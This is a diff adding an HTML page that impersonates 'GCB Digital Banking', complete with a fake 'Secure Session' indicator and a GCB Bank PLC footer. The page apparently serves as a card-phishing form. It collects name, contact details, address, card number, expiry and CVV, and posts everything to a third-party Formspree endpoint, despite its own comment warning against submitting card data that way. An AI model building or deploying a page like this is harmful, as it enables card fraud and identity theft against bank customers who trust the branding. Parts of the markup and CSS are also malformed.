@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Card Validation Form</title>
+  <style>
+    :root{
+      --bg: #f0f4ff;
+      --surface: #ffffff;
+      --text: #1f2937;
+      --muted: #6b7280;
+
+      --primary: #004b87;
+      --accent: #d4af37;
+      --accent-hover: #c29b2e;
+
+      --border: #d1d5db;
+      --ring: rgba(0, 75, 135, 0.28);
+
+      --radius: 12px;
+      --shadow: 0 10px 24px rgba(15, 23, 42, 0.10);
+      --maxw: 860px;
+    }
+
+    * { box-sizing: border-box; }
+
+    body{
+      margin: 0;
+      padding: 24px;
+      font-family: Arial, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      color: var(--text);
+      background: var(--bg);
+      line-height: 1.5;
+    }
+   }
+ .topbar{
+      background: linear-gradient(180deg, #0b3a6b 0%, #082f56 100%);
+      color:#fff;
+      padding: 14px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      box-shadow: 0 10px 26px rgba(2,6,23,.18);
+    }
+
+    .topbar__inner{
+      max-width: 980px;
+      margin: 0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-width: 0;
+    }
+
+    .brand__logo{
+      width:44px;
+      height:44px;
+      border-radius:999px;
+      background: #f1c40f;
+      color:#0b3a6b;
+      display:grid;
+      place-items:center;
+      font-weight:900;
+      letter-spacing:.5px;
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,.25);
+      flex: 0 0 auto;
+    }
+
+    .brand__text{ min-width: 0; line-height:1.05; }
+    .brand__title{
+      font-weight: 800;
+      font-size: 16px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .brand__subtitle{
+      font-size: 12px;
+      opacity: .85;
+      margin-top: 4px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .secure-pill{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      padding: 10px 12px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.14);
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
+      font-weight: 700;
+      font-size: 13px;
+      user-select:none;
+      flex: 0 0 auto;
+    }
+
+    .dot{
+      width:10px;
+      height:10px;
+      border-radius:999px;
+      background:#22c55e;
+      box-shadow: 0 0 0 3px rgba(34,197,94,.20);
+    }
+
+    .wrap{
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 22px 16px 32px;
+      display:flex;
+      justify-content:center;
+    }
+
+    .banking-portal{
+      max-width: var(--maxw);
+      margin: 0 auto;
+      background: var(--surface);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 22px;
+    }
+
+    h1{
+      color: var(--primary);
+      margin: 0 0 14px;
+      letter-spacing: 0.2px;
+    }
+
+    form{ margin-top: 12px; }
+
+    fieldset{
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+      margin: 0 0 14px;
+      background: #fff;
+    }
+
+    legend{
+      padding: 0 8px;
+      color: var(--primary);
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    label{
+      display: block;
+      font-weight: 600;
+      margin: 10px 0 6px;
+    }
+
+    input, select, textarea{
+      width: 100%;
+      padding: 11px 12px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      font-size: 1rem;
+      background: #fff;
+      color: var(--text);
+      outline: none;
+      transition: box-shadow 160ms ease, border-color 160ms ease, transform 80ms ease;
+    }
+
+    input::placeholder, textarea::placeholder{
+      color: var(--muted);
+    }
+
+    input:focus, select:focus, textarea:focus{
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px var(--ring);
+    }
+
+    input[type="checkbox"]{
+      width: auto;
+      margin-right: 10px;
+      transform: translateY(1px);
+    }
+
+    button{
+      appearance: none;
+      border: 0;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-weight: 700;
+      cursor: pointer;
+      background: var(--accent);
+      color: #fff;
+      transition: transform 80ms ease, background 160ms ease;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    button:hover{ background: var(--accent-hover); }
+    button:active{ transform: translateY(1px); }
+
+    button:focus-visible{
+      outline: none;
+      box-shadow: 0 0 0 4px var(--ring);
+    }
+
+    .hint{
+      color: var(--muted);
+      font-size: 0.92rem;
+      margin-top: 6px;
+    }
+
+    @media (min-width: 720px){
+      fieldset{
+        padding: 18px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px 16px;
+        align-items: start;
+      }
+
+      legend{
+        grid-column: 1 / -1;
+        margin-bottom: 2px;
+      }
+
+      .full-row{
+        grid-column: 1 / -1;
+      }
+
+      button{
+        width: auto;
+        justify-self: start;
+      }
+  
+	  .footer{
+      text-align:center;
+      color:#9ca3af;
+      font-size: 12.5px;
+      padding: 22px 16px 28px;
+    }
+
+    @media (min-width: 480px){
+      .card{ padding: 26px 22px 20px; }
+      .card__title{ font-size: 28px; }
+    }
+  </style>
+
+  <script>
+    // --- Safer HTTPS enforcement (won't break localhost or file previews)
+    (function enforceHttps() {
+      const isLocal =
+        location.hostname === "localhost" ||
+        location.hostname === "127.0.0.1" ||
+        location.hostname === "" || // file://
+        location.protocol === "file:";
+
+      if (!isLocal && location.protocol !== "https:") {
+        location.href = "https://" + location.host + location.pathname + location.search + location.hash;
+      }
+    })();
+
+    function validateForm() {
+      const form = document.getElementById("myForm");
+      const email = form.elements["email"].value.trim();
+
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailPattern.test(email)) {
+        alert("Please enter a valid email address.");
+        return false;
+      }
+      return true;
+    }
+
+    async function submitForm(event) {
+      event.preventDefault();
+
+      if (!validateForm()) return;
+
+      const form = document.getElementById("myForm");
+      const formData = new FormData(form);
+      const jsonData = Object.fromEntries(formData.entries());
+
+      // NOTE: Do NOT submit CVV/card data like this in real banking/payment systems.
+      // Use a PCI-compliant payment processor/tokenization instead.
+
+      try {
+        const endpoint = form.action; "https://formspree.io/f/meelnzav"
+        const formData = new FormData(form); "https://formspree.io/f/meelnzav"
+
+        const response = await fetch(endpoint, {
+          method: "POST",
+          headers: { "Accept": "application/json" },
+          body: formData,
+        });
+
+        if (response.ok) {
+          alert("Form submitted successfully!");
+          form.reset();
+        } else {
+          alert("There was a problem submitting the form.");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("Error submitting the form.");
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      // Attach submit handler (this was missing)
+      const form = document.getElementById("myForm");
+      form.addEventListener("submit", submitForm);
+
+      // Accordion (safe guard: only runs if you actually have accordion items)
+      const accordionItems = document.querySelectorAll(".accordion-item");
+      if (accordionItems.length) {
+        accordionItems.forEach(item => {
+          const header = item.querySelector(".accordion-header");
+          const content = item.querySelector(".accordion-content");
+          if (!header || !content) return;
+
+          header.addEventListener("click", () => {
+            content.style.display = content.style.display === "block" ? "none" : "block";
+          });
+        });
+      }
+    });
+  </script>
+</head>
+
+<body>
+  <header class="topbar" role="banner">
+    <div class="topbar__inner">
+      <div class="brand" aria-label="GCB Digital Banking">
+        <div class="brand__logo" aria-hidden="true">GCB</div>
+        <div class="brand__text">
+          <div class="brand__title">GCB Digital Banking</div>
+          <div class="brand__subtitle">Secure Client Portal</div>
+        </div>
+      </div>
+
+      <div class="secure-pill" aria-label="Secure Session">
+        <span class="dot" aria-hidden="true"></span>
+        Secure Session
+      </div>
+    </div>
+  </header>
+  
+  <div class="banking-portal">
+    <h1>Card Validation Form</h1>
+
+    <form
+    id="myForm"
+   action="https://formspree.io/f/meelnzav"
+  method="POST"
+      
+      <fieldset>
+        <legend>Personal Information</legend>
+
+        <div class="full-row">
+          <label for="fullName">Full Name:</label>
+          <input type="text" id="fullName" name="fullName" required placeholder="e.g., Ama Mensah" autocomplete="name" />
+        </div>
+
+        <div>
+          <label for="email">Email:</label>
+          <input type="email" id="email" name="email" required placeholder="e.g., ama@example.com" autocomplete="email" />
+        </div>
+
+        <div>
+          <label for="phone">Phone Number:</label>
+          <input type="tel" id="phone" name="phone" required placeholder="e.g., +233..." autocomplete="tel" />
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Address</legend>
+
+        <div class="full-row">
+          <label for="street">Street:</label>
+          <input type="text" id="street" name="street" required />
+        </div>
+
+        <div>
+          <label for="city">City:</label>
+          <input type="text" id="city" name="city" required />
+        </div>
+
+        <div>
+          <label for="state">State/Region:</label>
+          <input type="text" id="state" name="state" required />
+        </div>
+
+      </fieldset>
+
+      <fieldset>
+        <legend>Card Details</legend>
+
+        <div>
+          <label for="cardType">Card Type:</label>
+          <select id="cardType" name="cardType" required>
+            <option value="" selected disabled>Select one</option>
+            <option value="credit">Credit</option>
+            <option value="debit">Debit</option>
+          </select>
+        </div>
+
+        <div>
+          <label for="expiryDate">Expiry Date:</label>
+          <input type="month" id="expiryDate" name="expiryDate" required />
+        </div>
+
+        <div class="full-row">
+          <label for="cardNumber">Card Number:</label>
+          <input
+            type="text"
+            id="cardNumber"
+            name="cardNumber"
+            inputmode="numeric"
+            autocomplete="cc-number"
+            placeholder="1234 5678 9012 3456"
+            pattern="[0-9 ]{12,19}"
+            required
+          />
+          
+        </div>
+
+        <div>
+          <label for="cvv">CVV:</label>
+          <input
+            type="password"
+            id="cvv"
+            name="cvv"
+            inputmode="numeric"
+            autocomplete="cc-csc"
+            placeholder="***"
+            pattern="[0-9]{3,4}"
+            required
+          />
+        </div>
+      </fieldset>
+      
+      <fieldset>
+        <legend>Terms Acceptance</legend>
+        <label class="full-row">
+          <input type="checkbox" name="terms" required />
+          I accept the terms and conditions
+        </label>
+      </fieldset>
+
+      <button type="submit">Submit Application</button>
+    </form>
+  </div>
+</body>
+  
+  <footer class="footer">
+    © 2026 GCB Bank PLC. All rights reserved.
+  </footer>
+  
+</html>
